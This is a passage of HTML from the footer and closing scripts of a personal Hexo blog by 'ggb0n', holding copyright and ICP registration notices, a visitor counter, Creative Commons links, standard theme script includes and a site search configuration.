class="size-small"><span>&copy; 2020 ggb0n</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>,Modify by <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">removeif</a> <br><span>© 豫ICP备20003023号<br></span><span>© 版权说明：[本网站所有内容均收集于互联网或自己创作,<br>    方便于网友与自己学习交流，如有侵权，请<a href="/message" target="_blank">留言</a>，立即处理]<br></span><span><script type="text/javascript" src="/js/statistics.js"></script><script>var now = new Date();setInterval("createTime('2020/02/02 00:00:00')", 250,"");</script><span id="statistic-times">网站运行时间统计加载中...</span><br></span><div class="size-small"><span id="busuanzi_container_site_uv">❤️感谢<strong> <span id="busuanzi_value_site_uv">99+</span> </strong></span>小伙伴的<strong> <span id="busuanzi_value_site_pv">99+</span> </strong>次光临！❤️</div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ggb0n"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            site: {
                url: 'http://ggb0n.cool',
                external_link: {"enable":true,"exclude":[]}
            },
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to Top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back-to-top.js" defer></script><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.12/js/lightgallery-all.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><!--!--><!--!--><!--!--><script src="/js/toc.js" defer></script><script src="/js/main.js" defer></script><link rel="stylesheet" href="/css/insight.css"><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Type something..."><span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"></div></div></div></div><script>(function (window) {
            var INSIGHT_CONFIG = {
                TRANSLATION: {
                    POSTS: 'Posts',
                    PAGES: 'Pages',
                    CATEGORIES: 'Categories',
                    TAGS: 'Tags',
                    UNTITLED: '(Untitled)',
                },
                CONTENT_URL: '/content.json',
            };
            window.INSIGHT_CONFIG = INSIGHT_CONFIG;
        })(window);</script><script src="/js/insight.js" defer></script></body></html>